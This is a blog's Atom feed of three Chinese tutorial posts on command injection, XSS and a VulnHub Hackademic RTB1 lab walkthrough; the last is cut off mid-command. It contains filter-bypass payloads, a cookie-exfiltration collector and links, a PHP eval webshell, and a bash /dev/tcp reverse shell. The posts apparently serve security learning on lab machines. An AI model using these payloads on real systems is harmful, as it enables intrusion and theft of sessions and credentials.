<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>baiQstar的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-20T12:26:33.343Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>白易安</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>四十三，命令执行漏洞</title>
    <link href="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-01-20T12:25:59.000Z</published>
    <updated>2024-01-20T12:26:33.343Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="一-什么是命令执行">一、什么是命令执行</span></h2><p><strong>命令执行</strong>（Remote Command Execution, RCE）</p><p><strong>Web应用</strong>的脚本代码在<strong>执行命令</strong>的时候<strong>过滤不严</strong></p><p>从而注入一段<strong>攻击者能够控制</strong>的代码,在<strong>服务器</strong>上以Web服务的<strong>后台权限远程执行恶意指令</strong></p><h5><span id="成因"><strong>成因</strong></span></h5><ul><li>代码层过滤不严</li><li>系统的漏洞造成命令注入</li><li>调用的第三方组件存在代码执行漏洞常见的命令执行函数<ul><li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li><li>ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等</li><li>Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec等</li></ul></li></ul><h2><span id="二-常用命令执行函数">二、常用命令执行函数</span></h2><h3><span id="1system"><strong>1）system</strong></span></h3><p>该函数会把执行<strong>结果输出</strong> 并把输出结果的最后一行作为字符串返回 ，如果执行失败则返回false 这个也最为常用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>二次注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac%20f??g.p?p&quot;);</span><br></pre></td></tr></table></figure><p>看源码</p><p>看UA头</p><p>robots.txt</p><p>扫目录</p><h3><span id="2exec"><strong>2）exec</strong></span></h3><p><strong>不输出结果</strong>,返回执行结果的最后一行 ，需要使用<strong>echo</strong>进行输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3><span id="3passthru">3）passthru</span></h3><p>此函数只调用命令，并把运行结果原样地直接输出，没有返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">passthru(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3><span id="4shell_exec">4）shell_exec</span></h3><p>不输出结果，返回执行结果 ，使用<strong>反引号(&#96;&#96;)<strong>时调用的就是此函数，需要使用</strong>echo</strong>进行输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo `whoami`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2><span id="三-命令连接符">三、命令连接符</span></h2><p>Windows和Linux都支持的命令连接符：</p><ul><li><code>cmd1 | cmd2</code> 只执行cmd2</li><li><code>cmd1 || cmd2</code> 只有当cmd1执行失败后，cmd2才被执行</li><li><code>cmd1 &amp; cmd2</code> 先执行cmd1，不管是否成功，都会执行cmd2</li><li><code>cmd1 &amp;&amp; cmd2</code> 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2 Linux还支持分号<code>;</code></li><li><code>cmd1 ; cmd2</code> 按顺序依次执行，先执行cmd1再执行cmd2</li></ul><h2><span id="四-绕过姿势">四、绕过姿势</span></h2><h3><span id="1-常见分隔符"><strong>1、常见分隔符</strong></span></h3><ul><li>换行符 <code>%0a</code></li><li>回车符 <code>%0d</code></li><li>连续指令 <code>；</code></li><li>后台进程 <code>&amp;</code></li><li>管道符 <code>|</code></li><li>逻辑 <code>||</code>、<code>&amp;&amp;</code></li></ul><h3><span id="2-空格绕过"><strong>2、空格绕过</strong></span></h3><p>可以用以下字符代替空格</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">$&#123;&lt;!-- --&gt;<span class="variable constant_">IFS</span>&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>绕过空格的方法大概有以下几种：</p><ul><li>$IFS   ${IFS}   $IFS$9   &#x2F;&#x2F;$1改成$加其他数字貌似都行， {cat,flag.php} 用逗号实现了空格功能</li></ul><p>**ps:**有时会禁用cat: 解决方法是使用tac反向输出命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure><h3><span id="3-变量绕过">3、变量绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload 1：    a=ag.php;b=fl;cat$IFS$1$b$a        //cat flag.php</span><br></pre></td></tr></table></figure><h3><span id="3-内联执行绕过">3、内联执行绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload 2： cat$IFS$1`ls`               //cat ls</span><br></pre></td></tr></table></figure><p>使用内联执行会将 &#96;&#96;内的输出作为前面命令的输入，当我们输入上述payload时，等同于cat falg.php;cat index.php</p><h3><span id="4-编码绕过">4、编码绕过</span></h3><p><strong>base64：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo YWJjZGU=|base64 -d //打印出来abcde</span><br><span class="line">echo Y2F0IGZhbGcucGhw|base64 -d|bash //cat flag.php </span><br><span class="line">echo Y2F0IGZhbGcucGhw|base64 -d|sh //cat flag.php</span><br></pre></td></tr></table></figure><p><strong>hex：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 63617420666c61672e706870 | xxd -r -p|bash //cat flag.php</span><br></pre></td></tr></table></figure><h3><span id="5-通配符绕过">5、通配符绕过</span></h3><p>？？？在linux里面可以进行代替字母</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure><h3><span id="6-转义拼接">6、转义拼接</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\c\a\t /etc/passwd</span><br></pre></td></tr></table></figure><h3><span id="7-单引号和双引号">7、单引号和双引号</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at 1.tx&#x27;&#x27;t</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;一-什么是命令执行&quot;&gt;一、什么是命令执行&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;命令执行&lt;/strong&gt;（Remote Command Execution, RCE）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Web应用&lt;/strong&gt;的脚本代码在&lt;st</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>四十二，XSS跨站脚本攻击</title>
    <link href="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%BA%8C%EF%BC%8CXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%BA%8C%EF%BC%8CXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</id>
    <published>2024-01-20T12:24:40.000Z</published>
    <updated>2024-01-20T12:25:10.928Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="一-什么是跨站脚本攻击xss">一、什么是跨站脚本攻击（XSS）？</span></h2><p><strong>跨站脚本攻击</strong>（Cross-site Scripting，通常称为XSS），是一种典型的<strong>Web程序漏洞</strong>利用攻击。攻击者利用Web程序<strong>对用户输入检查不足的漏洞</strong>将可执行恶意脚本注入网站或Web应用，当<strong>用户访问网页时</strong>触发恶意脚本的执行，从而达到窃取用户个人数据、弹出广告，甚至篡改网页内容等攻击目的。在线论坛、博客、留言板等共享平台是跨站脚本攻击的典型目标。<br>与其他Web攻击类型不同，<strong>跨站脚本攻击</strong>是一种<strong>客户端代码注入攻击</strong>，恶意脚本在<strong>前端浏览器</strong>或<strong>Web应用程序</strong>等客户端侧执行，<strong>而非在后端服务器或数据库执行</strong>，最终受害者是<strong>访问用户</strong></p><h2><span id="二-常见跨站脚本攻击类型">二、常见跨站脚本攻击类型</span></h2><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240116190333.png" alt="微信截图_20240116190333"></p><h3><span id="1-反射型跨站脚本攻击">1、反射型跨站脚本攻击</span></h3><p>反射型跨站脚本攻击是最常见和最简单的攻击形式。</p><p>所谓反射，是指此种类型的<strong>注入脚本必须被包含在发往Web服务器</strong>的请求中，然后Web服务器以某种方式反射到用户浏览器执行。也就是注入脚本作为客户端的请求提交给Web服务器，服务器解析后在响应消息中返回脚本由浏览器执行。因此攻击者需要使用钓鱼邮件、弹窗链接以及其他社会工程学方法引诱用户点击链接向Web服务器发出请求。</p><p>攻击者往往在合法的URL末尾添加恶意代码构造链接，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;     //获取cookie</span><br></pre></td></tr></table></figure><p>做一个情景题：</p><p>受害者smithy和攻击者aaa都有一个steam账号，我们需要做的是时攻击者aaa得到simthy的cookie，然后登陆smithy的steam账号</p><p>如何做，攻击方aaa生成一个steam的恶意链接，smithy需要点击这个链接，我们就可以得到smithy的cookie</p><p>在kali中开启apache服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>切换到&#x2F;var&#x2F;www&#x2F;html目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure><p>生成一个cookie.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch cookie.php</span><br></pre></td></tr></table></figure><p>在cookie.php中写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi cookie.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cookie=$_GET[&#x27;cookie&#x27;]; </span><br><span class="line">file_put_contents(&#x27;cookie.txt&#x27;,$cookie); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>创建一个cookie.txt文件，用来存放获取到的cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch cookie.txt</span><br></pre></td></tr></table></figure><p>权限放开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cookie.txt </span><br><span class="line">chown www-data cookie.txt</span><br></pre></td></tr></table></figure><p>恶意链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.157/DVWA-master/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#x27;http://192.168.86.129/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3><span id="2-存储型跨站脚本攻击">2、存储型跨站脚本攻击</span></h3><p>存储型跨站脚本攻击也称为持久型跨站脚本攻击，是一种最具破坏性的跨站脚本攻击。注入的脚本永久存储在Web服务器上，如数据库、内存或文件系统中。只要注入脚本代码没有被清理，每次用户访问网页时都将加载恶意脚本。</p><p>网页劫持，只有插入的恶意代码改了一下，其他操作和反射型一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">window.onload = function() &#123; </span><br><span class="line">var link=document.getElementsByTagName(&quot;a&quot;); </span><br><span class="line">for(j = 0; j &lt; link.length; j++) &#123; </span><br><span class="line"> link[j].href=&quot;https://www.baidu.com&quot;;&#125; </span><br><span class="line">&#125; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3><span id="3-基于dom的跨站脚本攻击">3、基于DOM的跨站脚本攻击</span></h3><p>基于DOM（Document Object Model，文档对象模型）的跨站脚本攻击是一种更高级的攻击形式，通过篡改DOM注入恶意脚本。</p><h2><span id="三-xss的攻击载荷">三、XSS的攻击载荷</span></h2><p>以下所有标签的 &gt; 都可以用 &#x2F;&#x2F; 代替， 例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p><h4><span id="script标签">script标签</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;标签：</span><br><span class="line">&lt;script&gt;标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line">&lt;script&gt;document.location=&#x27;http://192.168.86.129/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4><span id="a标签">a标签</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(111)&#x27;</span><br><span class="line"></span><br><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><h4><span id="svg标签">svg标签</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;//</span><br></pre></td></tr></table></figure><h4><span id="img标签">img标签：</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br></pre></td></tr></table></figure><h4><span id="body标签">body标签：</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw=alert(1)&gt;</span><br></pre></td></tr></table></figure><h4><span id="video标签">video标签:</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure><h4><span id="style标签">style标签：</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h4><span id="绕过waf的常用语句">绕过waf的常用语句</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg οnlοad=alert(1)&gt;</span><br><span class="line"> &lt;a href=javascript:alert(1)&gt;</span><br><span class="line"> &lt;IMG SRC=javascript:alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"> &lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"> &lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240116171113.png" alt="微信截图_20240116171113"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;一-什么是跨站脚本攻击xss&quot;&gt;一、什么是跨站脚本攻击（XSS）？&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;跨站脚本攻击&lt;/strong&gt;（Cross-site Scripting，通常称为XSS），是一种典型的&lt;strong&gt;Web程序漏洞&lt;/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>四十一，Hackademic.RTB1靶机</title>
    <link href="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%80%EF%BC%8CHackademic-RTB1%E9%9D%B6%E6%9C%BA/"/>
    <id>http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%80%EF%BC%8CHackademic-RTB1%E9%9D%B6%E6%9C%BA/</id>
    <published>2024-01-20T12:23:04.000Z</published>
    <updated>2024-01-20T12:23:36.539Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="靶场下载地址">靶场下载地址</span></h1><h3><span id="一-靶场下载地址">一、靶场下载地址</span></h3><p><a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a></p><h3><span id="二-开始打靶">二、开始打靶</span></h3><h4><span id="1-获取靶机ip">1、获取靶机ip</span></h4><p>我们得到的靶机只有mac地址没有IP，需要查找ip</p><p>靶机和kali都需要设置nat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112165219-17050497270731.png" alt="QQ截图20240112165219"></p><h4><span id="2-nmap-dirsearch">2、Nmap、dirsearch</span></h4><p>我们获取了靶机的<code>IP</code>是<code>192.168.86.144</code>，接下来就是老套路，扫端口、扫目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-1000 192.168.86.144     //扫这个ip的1-1000个端口</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112165837.png" alt="QQ截图20240112165837"></p><p>在http页面发现一个新目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.144/Hackademic_RTB1</span><br></pre></td></tr></table></figure><p>用dirseach扫描该目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.86.144/Hackademic_RTB1/&quot; -x 403,404</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112171801.png" alt="QQ截图20240112171801"></p><p>都打开看看，<code>http://192.168.86.144/Hackademic_RTB1/wp-login.php</code>，但是没有账号密码</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112171933.png" alt="QQ截图20240112171933"></p><h4><span id="3-访问80端口">3、访问80端口</span></h4><p>东点点，西点点，我们发现一个新的目录和sql注入点</p><p>浏览发现有p和cat两个地方可以传参，p的sql注入失败了，那就从cat下手</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112170449.png" alt="QQ截图20240112170449"></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112170515.png" alt="QQ截图20240112170515"></p><p>发现有注入点，直接放sqlmap里面爆破</p><h4><span id="4-sqlmap">4、sqlmap</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.86.144/Hackademic_RTB1/?cat=1%27&quot;  --dbs --batch  //爆库</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112170811.png" alt="QQ截图20240112170811"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.86.144/Hackademic_RTB1/?cat=1&quot; --batch -D  wordpress --tables</span><br><span class="line">//爆表</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112171013.png" alt="QQ截图20240112171013"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.86.144/Hackademic_RTB1/?cat=1&quot;  --batch -D wordpress -T wp_users --column     //爆列</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112171101.png" alt="QQ截图20240112171101"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.86.144/Hackademic_RTB1/?cat=1&quot;  --batch -D wordpress -T wp_users  -C &quot;user_login,user_pass&quot; --dump</span><br><span class="line">//爆名      --dump参数表示将从数据库中获取的数据进行输出。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112171300.png" alt="QQ截图20240112171300"></p><h4><span id="5-登陆">5、登陆</span></h4><p>将得到的账号密码输入到登陆页面</p><p>有些账号是有管理员权限的有的没有</p><p>我们登陆NickJames   admin</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112173606.png" alt="QQ截图20240112173606"></p><h4><span id="6-文件上传漏洞">6、文件上传漏洞</span></h4><p>找一找有没有什么文件上传的漏洞</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112173649.png" alt="QQ截图20240112173649"></p><p>在hello.php中插入一句话木马，然后使用蚁剑连接一下,连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]) ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112174043.png" alt="QQ截图20240112174043"></p><p>我们点击终端</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112202702.png" alt="QQ截图20240112202702"></p><p>输入<code>whoami</code>查看<code>当前有效的用户名称</code>，发现是<code>apache</code>，权限等级甚至<code>低于普通用户</code>，我们的下一步操作是<code>提升权限</code></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112202720.png" alt="QQ截图20240112202720"></p><h4><span id="7-提升权限">7、提升权限</span></h4><p>这里我们需要利用到<code>反弹shell</code></p><p>先在kali里面输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>然后到蚁剑终端输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.86.129/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112202739.png" alt="QQ截图20240112202739"></p><p>kali就会进入到操作界面，在这里进行提权操作</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112203723.png" alt="QQ截图20240112203723"></p><p>这里的bash不太好用，我们给他升级一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;     </span><br><span class="line">ctrl  z </span><br><span class="line">stty raw -echo;fg;reset </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112204222.png" alt="QQ截图20240112204222"></p><p>现在正是进行提权操作，升到root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a            //用于显示系统信息的命令</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112204446.png" alt="QQ截图20240112204446"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit  2.6.3|grep Local</span><br><span class="line"></span><br><span class="line">//  searchsploit 2.6.3 | grep Local 是在使用Exploit Database的搜索工具 searchsploit 来查找特定版本（2.6.3）的漏洞利用脚本，并使用 grep 过滤本地（Local）漏洞的结果。</span><br></pre></td></tr></table></figure><p>选择rc版本高一点的</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112204521.png" alt="QQ截图20240112204521"></p><p>我们可以看到tmp目录下成功生成了，把15285.c复制到蚁剑的tmp目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">cp 